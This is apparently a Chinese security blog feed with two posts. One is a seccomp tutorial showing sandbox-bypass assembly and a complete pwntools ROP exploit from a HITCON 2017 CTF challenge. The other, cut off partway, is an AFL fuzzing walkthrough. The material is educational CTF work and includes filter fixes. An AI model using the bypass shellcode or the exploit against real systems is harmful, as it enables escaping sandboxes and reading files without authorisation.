seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);    seccomp_load(ctx);    printf(&quot;###\n&quot;);    system(&quot;ls&quot;);    execve(args[0], args, 0);    return 0;}</code></pre><p>测试发现这里对 system 没有提示，直接过滤了，对 execve 会提示“invalid system call”。不过具体的功能是一样的：</p><pre><code class="bash">➜  seccomp ./sec###[1]    5480 invalid system call  ./sec</code></pre><h1 id="Bypass-Seccomp"><a href="#Bypass-Seccomp" class="headerlink" title="Bypass Seccomp"></a>Bypass Seccomp</h1><p>一般来说 64 位下的 Seccomp 会和前面的一样直接禁掉某个调用号。这种情况有一些方法可以对其绕过。</p><h2 id="绕过没有检查架构（arch）"><a href="#绕过没有检查架构（arch）" class="headerlink" title="绕过没有检查架构（arch）"></a>绕过没有检查架构（arch）</h2><p>一般题目里至少有 <code>SYS_mmap</code> 或 <code>SYS_mprotect</code> 能用，所以通常有机会执行任意 shellcode。通过下面的函数可以在 x86 和 x86_64 之间切换。<code>retf</code> 相当于 <code>POP IP</code> 和 <code>POP CS</code> 两条指令，而 32 位下 CS 为 0x23；64 位下 CS 为 0x33：</p><pre><code class="nasm">to32:    mov DWORD [rsp + 4], 0x23    retfto64:    mov DWORD [esp + 4], 0x33    retf</code></pre><p>假如程序的过滤规则和上面的一样，我们编写一个 <code>my_execve</code> 来调用：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;linux/seccomp.h&gt;#include &lt;linux/filter.h&gt;extern void my_execve(void *, void *, void *);char *args[] = {    &quot;/bin/ls&quot;,    0,};int main() {    struct sock_filter filter[] = {        BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -&gt; nr        BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // SYS_execve = 59        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),    };    struct sock_fprog prog = {        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),        .filter = filter,    };    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog);    my_execve(args[0], args, 0);}</code></pre><p><code>my_execve</code> 实现如下，因为 32 位下栈会少一半，所以为了防止程序 crash 需要搬一下栈：</p><pre><code class="nasm">section .textglobal my_execvemy_execve:    lea rsp, [stack]    call to32    mov eax, 11    mov ebx, edi    mov ecx, esi    int 0x80    retto32:    mov DWORD [rsp + 4], 0x23    retfsection .bss    resb 0x400stack:</code></pre><p>这样就可以成功执行 ls（如果开 sh 的话也没有办法执行命令的，因为 seccomp 的规则会在进程间继承）：</p><pre><code class="bash">➜  seccomp ./secMakefile  dd  sec  sec.asm  sec.c  sec.o</code></pre><p>限制办法就是添加对 arch 的检查：</p><pre><code class="cpp">struct sock_filter filter[] = {    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 4), // ld arch    BPF_JUMP(BPF_JMP + BPF_JEQ, 0xc000003e, 0, 3), // arch == x86_64    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -&gt; nr    BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // SYS_execve = 59    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),};</code></pre><h2 id="没有过滤-X32-SYSCALL-BIT"><a href="#没有过滤-X32-SYSCALL-BIT" class="headerlink" title="没有过滤 __X32_SYSCALL_BIT"></a>没有过滤 <code>__X32_SYSCALL_BIT</code></h2><ul><li>在 x86_64 下的一种特殊模式，使用 64 位寄存器和 32 位地址。</li><li>x32 中 <code>nr</code> 会加 <code>__X32_SYSCALL_BIT</code>（0x40000000），见 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/uapi/asm/unistd.h" target="_blank" rel="noopener">include/uapi/asm/unistd.h</a>（<code>/usr/include/asm/unistd_x32.h</code>）</li><li>原本的系统调用号加上 0x40000000 是一样的效果</li></ul><p>把 my_execve 修改如下：</p><pre><code class="nasm">section .textglobal my_execvemy_execve:    mov rax, 59 + 0x40000000    syscall</code></pre><p>同样可以正常执行</p><pre><code class="bash">➜  seccomp ./secMakefile  dd  sec  sec.asm  sec.c  sec.o</code></pre><p>添加对系统调用号的检查来进行限制：</p><pre><code class="cpp">struct sock_filter filter[] = {    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 4), // ld arch    BPF_JUMP(BPF_JMP + BPF_JEQ, 0xc000003e, 0, 4), // arch == x86_64    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -&gt; nr    BPF_JUMP(BPF_JMP + BPF_JSET, 0x40000000, 2, 0), // nr &amp; 0x40000000    BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // SYS_execve = 59    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),};</code></pre><h2 id="没有道理的绕过方法"><a href="#没有道理的绕过方法" class="headerlink" title="没有道理的绕过方法"></a>没有道理的绕过方法</h2><ul><li>部分调用号是给 x32 用的，但在 x86_64 下一样能用</li><li>59、520、59+0x40000000、520+0x40000000 都是 execve</li><li>322、322+0x40000000、545、545+0x40000000（stub_execveat，和 execve 类似）也可以</li></ul><h1 id="Binary-Test"><a href="#Binary-Test" class="headerlink" title="Binary Test"></a>Binary Test</h1><p>使用 seccomp-tools 对一些题目进行测试。</p><h2 id="pwnable-tw-orw"><a href="#pwnable-tw-orw" class="headerlink" title="pwnable.tw-orw"></a>pwnable.tw-orw</h2><p>这道题当时是只能用 read、open、write 三个调用来读 flag。这里用 seccomp-tools 来查看一下是怎么实现的限制：</p><pre><code class="bash">$ seccomp-tools dump ./orw line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38) 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</code></pre><p>可以看到先是检查了 arch 必须是 32 位，然后系统调用只允许 rt_sigreturn、sigreturn、exit_group、exit、open、read、write。</p><h2 id="0CTF-2018-mathgame"><a href="#0CTF-2018-mathgame" class="headerlink" title="0CTF-2018-mathgame"></a>0CTF-2018-mathgame</h2><p>这道题也是限制了 arch 和一些调用：</p><pre><code class="bash">$ seccomp-tools dump ./mathgameStarting system, please wait...System started! line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x01 0x00 0x40000003  if (A == ARCH_I386) goto 0003 0002: 0x06 0x00 0x00 0x00000000  return KILL 0003: 0x20 0x00 0x00 0x00000000  A = sys_number 0004: 0x15 0x00 0x01 0x000000ad  if (A != rt_sigreturn) goto 0006 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0006: 0x15 0x00 0x01 0x00000077  if (A != sigreturn) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0008: 0x15 0x00 0x01 0x000000fc  if (A != exit_group) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0010: 0x15 0x00 0x01 0x00000001  if (A != exit) goto 0012 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0012: 0x15 0x00 0x01 0x00000005  if (A != open) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0014: 0x15 0x00 0x01 0x00000003  if (A != read) goto 0016 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0016: 0x15 0x00 0x01 0x00000004  if (A != write) goto 0018 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0018: 0x15 0x00 0x01 0x000000c5  if (A != fstat64) goto 0020 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0020: 0x15 0x00 0x01 0x00000036  if (A != ioctl) goto 0022 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0022: 0x15 0x00 0x01 0x0000008c  if (A != _llseek) goto 0024 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0024: 0x15 0x00 0x01 0x000000c0  if (A != mmap2) goto 0026 0025: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0026: 0x15 0x00 0x01 0x0000005b  if (A != munmap) goto 0028 0027: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0028: 0x15 0x00 0x01 0x0000002d  if (A != brk) goto 0030 0029: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0030: 0x06 0x00 0x00 0x00000000  return KILL</code></pre><h1 id="Related-CTF-Challs"><a href="#Related-CTF-Challs" class="headerlink" title="Related CTF Challs"></a>Related CTF Challs</h1><p>CTF 中涉及 Seccomp 的一些二进制题。记录一下用于在 IDA 中插入的 Seccomp 结构体：</p><pre><code class="cpp">struct sock_filter {    /* Filter block */    uint16_t    code;   /* Actual filter code */    uint8_t    jt;    /* Jump true */    uint8_t    jf;    /* Jump false */    uint32_t    k;      /* Generic multiuse field */};struct sock_fprog {    /* Required for SO_ATTACH_FILTER. */    unsigned short        len;    /* Number of filter blocks */    struct sock_filter *filter;};</code></pre><h2 id="HITCON-2017-seccomp"><a href="#HITCON-2017-seccomp" class="headerlink" title="HITCON-2017-seccomp"></a>HITCON-2017-seccomp</h2><p>先是一道逆向。程序不难，主要是逆 Seccomp 的部分来得出正确的 6 个参数。这里放一下<a href="https://blukat29.github.io/2017/11/hitcon-quals-2017-seccomp/" target="_blank" rel="noopener">其他大佬的 Writeup</a>：</p><pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp){  signed int i; // [rsp+Ch] [rbp-54h]  struct sock_fprog prog; // [rsp+10h] [rbp-50h]  __int64 args[6]; // [rsp+20h] [rbp-40h]  unsigned __int64 v7; // [rsp+58h] [rbp-8h]  v7 = __readfsqword(0x28u);  prog.len = 4059;  prog.filter = (struct sock_filter *)&amp;s;  memset(args, 0, sizeof(args));  for ( i = 0; i &lt;= 4; ++i )    _isoc99_scanf(&quot;%llu&quot;, &amp;args[i]);  prctl(38, 1LL, 0LL, 0LL, 0LL);  if ( prctl(22, 2LL, &amp;prog) )  {    perror(&quot;prctl&quot;);    exit(1);  }  syscall(4919LL, args[0], args[1], args[2], args[3], args[4], args[5]);  printf(&quot;Excellent! flag: hitcon{%s}\n&quot;, args);  return 0;}</code></pre><h2 id="HITCON-2017-Impeccable-Artifact"><a href="#HITCON-2017-Impeccable-Artifact" class="headerlink" title="HITCON-2017-Impeccable_Artifact"></a>HITCON-2017-Impeccable_Artifact</h2><p>程序保护全开，且能对栈上的任意 8 个字节进行读写，同时没有对下标进行检查，所以能造成任意地址读写。然后一开始在 prepare 函数中对 syscall 进行了限制：</p><pre><code class="cpp">__int64 __fastcall main(__int64 a1, char **a2, char **a3){  int c; // [rsp+8h] [rbp-658h]  int idx; // [rsp+Ch] [rbp-654h]  __int64 arr[201]; // [rsp+10h] [rbp-650h]  unsigned __int64 v7; // [rsp+658h] [rbp-8h]  v7 = __readfsqword(0x28u);  prepare();  memset(arr, 0, 0x640uLL);  while ( 1 )  {    menu();    idx = 0;    _isoc99_scanf(&quot;%d&quot;, &amp;c);    if ( c != 1 &amp;&amp; c != 2 )      break;    puts(&quot;Idx?&quot;);    _isoc99_scanf(&quot;%d&quot;, &amp;idx);    if ( c == 1 )    {      printf(&quot;Here it is: %lld\n&quot;, arr[idx]);    }    else    {      puts(&quot;Give me your number:&quot;);      _isoc99_scanf(&quot;%lld&quot;, &amp;arr[idx]);    }  }  return 0LL;}</code></pre><p>用 seccomp-tools 中可以查看到程序判断了系统架构，然后将传入的第三个参数作为系统调用号（即 rdx 等于 rax），后面会判断 sys_number 和 rdx 是否相等，如果相等也能过 check，这个地方可以构造出一些本身被限制的函数。然后允许 read、write、fstat 等一些函数：</p><pre><code> line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x10 0xc000003e  if (A != ARCH_X86_64) goto 0018 0002: 0x20 0x00 0x00 0x00000020  A = args[2] 0003: 0x07 0x00 0x00 0x00000000  X = A 0004: 0x20 0x00 0x00 0x00000000  A = sys_number 0005: 0x15 0x0d 0x00 0x00000000  if (A == read) goto 0019 0006: 0x15 0x0c 0x00 0x00000001  if (A == write) goto 0019 0007: 0x15 0x0b 0x00 0x00000005  if (A == fstat) goto 0019 0008: 0x15 0x0a 0x00 0x00000008  if (A == lseek) goto 0019 0009: 0x15 0x01 0x00 0x00000009  if (A == mmap) goto 0011 0010: 0x15 0x00 0x03 0x0000000a  if (A != mprotect) goto 0014 0011: 0x87 0x00 0x00 0x00000000  A = X 0012: 0x54 0x00 0x00 0x00000001  A &amp;= 0x1 0013: 0x15 0x04 0x05 0x00000001  if (A == 1) goto 0018 else goto 0019 0014: 0x1d 0x04 0x00 0x0000000b  if (A == X) goto 0019 0015: 0x15 0x03 0x00 0x0000000c  if (A == brk) goto 0019 0016: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0019 0017: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0019 0018: 0x06 0x00 0x00 0x00000000  return KILL 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW</code></pre><p>经过调试可以找到某些地址泄漏 Binary 和 libc，然后改 ret 处的代码构造 ROP 就能任意文件读取：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]p = process(&#39;./artifact&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def cmd(c):    p.recvuntil(&#39;Choice?\n&#39;)    p.sendline(str(c))def show(idx):    cmd(1)    p.recvuntil(&#39;Idx?\n&#39;)    p.sendline(str(idx))    p.recvuntil(&#39;Here it is:&#39;)    return int(p.recvuntil(&#39;\n&#39;, drop=True))def memo(idx, num):    cmd(2)    p.recvuntil(&#39;Idx?\n&#39;)    p.sendline(str(idx))    p.recvuntil(&#39;Give me your number:\n&#39;)    p.sendline(str(num))def leave():    cmd(3)binary_base = show(202) - 0xbb0bss_buf = binary_base + 0x202000info(&#39;binary_base = &#39; + hex(binary_base))offset = 0x00007ffff7a2d830 - 0x7ffff7a0d000libc_base = show(203) - offsetinfo(&#39;libc_base = &#39; + hex(libc_base))pop_rdi_ret = libc_base + next(libc.search(asm(&#39;pop rdi ; ret&#39;)))pop_rsi_ret = libc_base + next(libc.search(asm(&#39;pop rsi ; ret&#39;)))pop_rdx_ret = libc_base + next(libc.search(asm(&#39;pop rdx ; ret&#39;)))read_addr = libc_base + libc.symbols[&#39;read&#39;]write_addr = libc_base + libc.symbols[&#39;write&#39;]open_addr = libc_base + libc.symbols[&#39;open&#39;]def set_syscall(idx, syscall, rdi, rsi, rdx):    memo(idx, pop_rdi_ret)    memo(idx + 1, rdi)    memo(idx + 2, pop_rsi_ret)    memo(idx + 3, rsi)    memo(idx + 4, pop_rdx_ret)    memo(idx + 5, rdx)    memo(idx + 6, syscall)file_name_addr = bss_buf + 0x500buf_addr = bss_buf + 0x600set_syscall(203, read_addr, 0, file_name_addr, 0x20) # read file&#39;s nameset_syscall(210, open_addr, file_name_addr, 0, 2) # open&#39;s syscall number == 2set_syscall(217, read_addr, 3, buf_addr, 0x1000) # read file&#39;s contentset_syscall(224, write_addr, 1, buf_addr, 0x1000) # write to stdoutleave()p.sendline(&#39;exp.py\x00&#39;)p.interactive()</code></pre><h2 id="BSides-CTF-2015-Baby-Playpen-Fence"><a href="#BSides-CTF-2015-Baby-Playpen-Fence" class="headerlink" title="BSides-CTF-2015-Baby_Playpen_Fence"></a>BSides-CTF-2015-Baby_Playpen_Fence</h2><p>TODO</p><h2 id="BSides-CTF-2015-Big-Prison-Fence"><a href="#BSides-CTF-2015-Big-Prison-Fence" class="headerlink" title="BSides-CTF-2015-Big_Prison_Fence"></a>BSides-CTF-2015-Big_Prison_Fence</h2><p>TODO</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=gQXyZY7Ucjc" target="_blank" rel="noopener">https://www.youtube.com/watch?v=gQXyZY7Ucjc</a><br><a href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/" target="_blank" rel="noopener">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a><br><a href="https://www.linuxidc.com/Linux/2015-02/112913.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2015-02/112913.htm</a><br><a href="https://en.wikipedia.org/wiki/Seccomp" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Seccomp</a><br><a href="https://atum.li/2017/04/25/linuxsandbox/#seccomp" target="_blank" rel="noopener">https://atum.li/2017/04/25/linuxsandbox/#seccomp</a><br><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a><br><a href="https://github.com/briansp8210/CTF-writeup/tree/master/HITCON-2017-qual/Impeccable-Artifact" target="_blank" rel="noopener">https://github.com/briansp8210/CTF-writeup/tree/master/HITCON-2017-qual/Impeccable-Artifact</a><br><a href="https://blukat29.github.io/2017/11/hitcon-quals-2017-artifact/" target="_blank" rel="noopener">https://blukat29.github.io/2017/11/hitcon-quals-2017-artifact/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Seccomp 可以为“不可信的纯计算型代码”提供一个“安全（SAFE, not SECURE）”的运行环境，以保护你的系统和应用程序的正常运行不受不可信代码的干扰。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="linux" scheme="blog.b3ale.cn/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Fuzzing to Exploit</title>
    <link href="blog.b3ale.cn/2020/04/13/Fuzzing-to-Exploit/"/>
    <id>blog.b3ale.cn/2020/04/13/Fuzzing-to-Exploit/</id>
    <published>2020-04-13T11:06:40.000Z</published>
    <updated>2020-04-24T10:32:02.452Z</updated>
    
    <content type="html"><![CDATA[<p>AFL Fuzz 初体验。</p><a id="more"></a><blockquote><p>“Fuzzing is a Black Box software testing technique, which basically consists in finding implementation bugs using malformed/semi-malformed data injection in an automated fashion.”</p></blockquote><h1 id="American-Fuzzy-Lop"><a href="#American-Fuzzy-Lop" class="headerlink" title="American Fuzzy Lop"></a>American Fuzzy Lop</h1><p>AFL（American Fuzzy Lop）是由安全研究员 Michal Zalewski（@lcamtuf）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。</p><ol><li>从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）；</li><li>选择一些输入文件，作为初始测试集加入输入队列（queue）；</li><li>将队列中的文件按一定的策略进行“突变”；</li><li>如果经过变异文件更新了覆盖范围，则将其保留添加到队列中；</li><li>上述过程会一直循环进行，期间触发了 crash 的文件会被记录下来。</li></ol><p><img src="/pics/Fuzzing-to-Exploit/1.png" srcset="/img/loading.gif" alt></p><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>安装 AFL 的方式和一般源码编译的程序一样。其中 AFL 的 QEMU 模式常用于黑盒测试。但是因为 AFL 使用的 QEMU 版本太旧，<code>util/memfd.c</code> 中定义的函数 <code>memfd_create()</code> 会和 glibc 中的同名函数冲突，AFL 在 qemu_mode 文件夹下提供了一个脚本 build_qemu_support.sh，用于 patch 一个新的 QEMU。安装完成后，可以看到有以下这些命令：</p><pre><code class="bash">➜  afl-2.52b afl-afl-analyze     afl-clang++     afl-fuzz        afl-gcc         afl-plot        afl-showmap     afl-whatsupafl-clang       afl-cmin        afl-g++         afl-gotcpu      afl-qemu-trace  afl-tmin</code></pre><p>记录几个常用的命令：</p><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center"><code>afl-analyze</code></td><td style="text-align:center">以指定输入为基础对程序进行分析识别出程序合法输入的轮廓</td></tr><tr><td style="text-align:center"><code>afl-clang++</code>/<code>afl-clang</code></td></tr><tr><td style="text-align:center"><code>afl-cmin</code></td><td style="text-align:center">尝试找到与测试样例全集具有相同覆盖范围的最小子集</td></tr><tr><td style="text-align:center"><code>afl-fuzz</code></td><td style="text-align:center">AFL 进行 Fuzzing 的主程序</td></tr><tr><td style="text-align:center"><code>afl-g++</code>/<code>afl-gcc</code></td><td style="text-align:center">编译生成的文件可以通过设置 <code>LD_LIBRARY_PATH</code> 让程序加载经过 AFL 插桩的 <code>.so</code> 文件；或者可以直接加上 <code>--disable-shared</code> 进行静态编译</td></tr><tr><td style="text-align:center"><code>afl-gotcpu</code></td><td style="text-align:center">用于查看每个核心使用状态</td></tr><tr><td style="text-align:center"><code>afl-plot</code></td><td style="text-align:center">用于绘制各种状态指标的直观变化趋势</td></tr><tr><td style="text-align:center"><code>afl-showmap</code></td><td style="text-align:center">跟踪单个输入的执行路径，并打印程序执行的输出、捕获的元组</td></tr><tr><td style="text-align:center"><code>afl-tmin</code></td><td style="text-align:center">减小单个输入样例的大小</td></tr><tr><td style="text-align:center"><code>afl-whatsup</code></td><td style="text-align:center">用于查看每个 fuzzer 的运行状态和总体运行概况，加上 <code>-s</code> 选项只显示概况，其中的数据都是所有 fuzzer 的总和</td></tr></tbody></table><h1 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h1><p>本文主要记录怎么用 Fuzzing 对 PWN 题漏洞点寻找。首先可以在当前目录下新建一个文件夹 <code>in</code>，然后使用 tee 来记录下手动输入的一些测试样例：</p><pre><code class="bash">tee in/pattern.txt | ./binary</code></pre><p>接下来可以直接使用 <code>afl-fuzz</code> 对程序 Fuzzing。其中 <code>-i</code> 指定输入目录，<code>-o</code> 指定输出目录，<code>-Q</code> 表示使用 QEMU 模式：</p><pre><code class="bash">afl-fuzz -i in -o out -Q -- ./binary</code></pre><p>运行的时候可能会报错：</p><pre><code class="bash">afl-fuzz 2.52b by &lt;lcamtuf@google.com&gt;[+] You have 1 CPU core and 1 runnable tasks (utilization: 100%).[*] Checking core_pattern...[-] Hmm, your system is configured to send core dump notifications to an    external utility. This will cause issues: there will be an extended delay    between stumbling upon a crash and having this information relayed to the    fuzzer via the standard waitpid() API.    To avoid having crashes misinterpreted as timeouts, please log in as root    and temporarily modify /proc/sys/kernel/core_pattern, like so:    echo core &gt;/proc/sys/kernel/core_pattern[-] PROGRAM ABORT : Pipe at the beginning of &#39;core_pattern&#39;         Location : check_crash_handling(), afl-fuzz.c:7275</code></pre><p>在执行 <code>afl-fuzz</code> 前，如果系统配置为将核心转储文件（core）通知发送到外部程序，将导致将崩溃信息发送到 Fuzzer 之间的延迟增大，进而可能将崩溃被误报为超时，所以得临时修改 core_pattern 文件：</p><pre><code class="bash">echo core | sudo tee /proc/sys/kernel/core_pattern</code></pre><p>接下来就可以开始 Fuzz：</p><p><img src="/pics/Fuzzing-to-Exploit/2.png" srcset="/img/loading.gif" alt></p><p>状态窗口中“cycles done”字段颜色的颜色可以作为何时停止测试的参考。随着周期数不断增大，其颜色也会由洋红色，逐步变为黄色、蓝色、绿色。当其变为绿色时，继续 Fuzzing 下去也很难有新的发现了，这时便可以通过 Ctrl-C 停止 <code>afl-fuzz</code>。在输出的 <code>out</code> 文件夹下的 <code>crashes</code>，可以看到测试得到使程序 crash 的几个样例：</p><pre><code class="bash">➜  crashes lsid:000000,sig:06,src:000000,op:havoc,rep:2  id:000001,sig:06,src:000000,op:havoc,rep:4  id:000002,sig:06,src:000000,op:havoc,rep:2  README.txt</code></pre><p>使用 <code>afl-tmin</code> 可以获得最小的测试样例：</p><pre><code class="bash">afl-tmin -i out/crashes/xxx -o min -Q -- ./binary</code></pre><h1 id="Plaid-CTF-2015-PlaidDB"><a href="#Plaid-CTF-2015-PlaidDB" class="headerlink" title="Plaid-CTF-2015-PlaidDB"></a>Plaid-CTF-2015-PlaidDB</h1><p>以之前的一道题目为例。使用 <code>afl-fuzz</code> 对程序进行测试，跑了一段时间后可以得到几个使 crash 的结果：</p><pre><code>➜  crashes xxd id:000000,sig:06,src:000000,op:havoc,rep:20000000: 5055 540a 410a 300a 4445 4c0a 410a 5055  PUT.A.0.DEL.A.PU0000010: 540a 4e4e 4e4e 4e4e 0a30 0a47 4554 0a41  T.NNNNNN.0.GET.A0000020: 415a 4141 4141 4141 4141 4141 4141 4141  AZAAAAAAAAAAAAAA0000030: 4141 4141 4155 540a 410a                 AAAAAUT.A.➜  crashes xxd id:000001,sig:06,src:000000,op:havoc,rep:40000000: 5055 540a 410a 300a 4445 4c0a 410a 5055  PUT.A.0.DEL.A.PU0000010: 540a 4e4e 4e4e 4e4e 0a30 0a47 4554 0a58  T.NNNNNN.0.GET.X0000020: 4141 ae41 4141 4141 4141 4141 4141 4141  AA.AAAAAAAAAAAAA0000030: 4141 4139 4155 540a 410a                 AAA9AUT.A.➜  crashes xxd id:000002,sig:06,src:000000,op:havoc,rep:20000000: 5055 540a 410a 300a 4445 4c0a 410a 5055  PUT.A.0.DEL.A.PU0000010: 540a 4e4e 5554 0a4e 0a30 0a47 4554 0a41  T.NNUT.N.0.GET.A0000020: 4141 410a 4e0a 300a 4745 540a 4141 4141  AAA.N.0.GET.AAAA0000030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA0000040: 4141 4141 0a                             AAAA.</code></pre><p>然后用 <code>afl-tmin</code> 来将样例最小化：</p><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB xxd min0000000: 5055 540a 0a0a 5055 540a 0a0a 4745 540a  PUT...PUT...GET.0000010: 3030 3030 3030 3030 3030 3030 3030 3030  00000000000000000000020: 3030 3030 3030 3030 0a                   00000000.</code></pre><p>然后输入样例可以看到程序会 crash。发现程序在 free 的时候发现下一个 chunk 的 size 不合法，再经过一定的调试就可以定位到 Off-by-Null：</p><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB cat min | ./datastoreINFO: Welcome to the PlaidDB data storage service.INFO: Valid commands are GET, PUT, DUMP, DEL, EXITPROMPT: Enter command:PROMPT: Enter row key:PROMPT: Enter data size:PROMPT: Enter data:INFO: Insert successful.PROMPT: Enter command:PROMPT: Enter row key:PROMPT: Enter data size:PROMPT: Enter data:INFO: Update successful.PROMPT: Enter command:PROMPT: Enter row key:ERROR: Row not found.*** Error in `./datastore&#39;: free(): invalid next size (fast): 0x000055f7ab2a20f0 ***[1]    21002 done       cat min |       21003 abort      ./datastore</code></pre><h1 id="tcpdump-4-9-0"><a href="#tcpdump-4-9-0" class="headerlink" title="tcpdump-4.9.0"></a>tcpdump-4.9.0</h1><p>这里再对 64 位的 tcpdump-4.9.0 进行了测试。在安装 tcpdump 之前要先安装 libpcap：</p><pre><code class="bash">wget http://www.tcpdump.org/release/libpcap-1.8.1.tar.gztar -zxvf libpcap-1.8.1.tar.gz &amp;&amp; cd libpcap-1.8.1./configuremakesudo make install</code></pre><p>然后使用用 <code>afl-gcc</code> 和 <code>afl-g++</code> 对 tcpdump 进行编译：</p><pre><code class="bash">wget http://www.tcpdump.org/release/tcpdump-4.9.0.tar.gztar -zxvf tcpdump-4.9.0.tar.gz &amp;&amp; cd tcpdump-4.9.0CC=afl-gcc CXX=afl-g++ ./configuremakesudo make install</code></pre><p>安装完后查看以下版本：</p><pre><code class="bash">$ tcpdump --versiontcpdump version 4.9.0libpcap version 1.8.1</code></pre><p>然后从 <a href="https://wiki.wireshark.org/SampleCaptures" target="_blank" rel="noopener">Wireshark 官网</a>上下载一些流量包，作为测试的样例，并使用 editcap 将每个流量包分成四份：</p><pre><code class="bash">$ for i in `ls` ; do editcap -c 4 $i Trimmed/trimm.pcap ; done$ ls Trimmed/ | wc -l32170</code></pre><p>然后用 <code>alf-cmin</code> 把测试样例再缩小。需要从文件中获取输入的话，可以使用“@@”代替被测试程序命令行中输入文件名的位置：</p><pre><code class="bash">$ afl-cmin -i Trimmed/ -o Pcap-corpus/ -- tcpdump -ee -vv -nnr @@corpus minimization tool for afl-fuzz by &lt;lcamtuf@google.com&gt;[*] Testing the target binary...[+] OK, 377 tuples recorded.[*] Obtaining traces for input files in &#39;Trimmed/&#39;...    Processing file 32170/32170...[*] Sorting trace sets (this may take a while)...[+] Found 13843 unique tuples across 32170 files.[*] Finding best candidates for each tuple...    Processing file 32170/32170...[*] Sorting candidate list (be patient)...[*] Processing candidates and writing output files...    Processing tuple 13843/13843...[+] Narrowed down to 380 files, saved in &#39;Pcap-corpus/&#39;.</code></pre><p>最后使用 <code>afl-fuzz</code> 对程序测试，可以使用 <code>screen</code> 把程序放在后台运行：</p><pre><code class="bash">$ screen afl-fuzz -i PCAPS/Pcap-corpus/ -o out -- 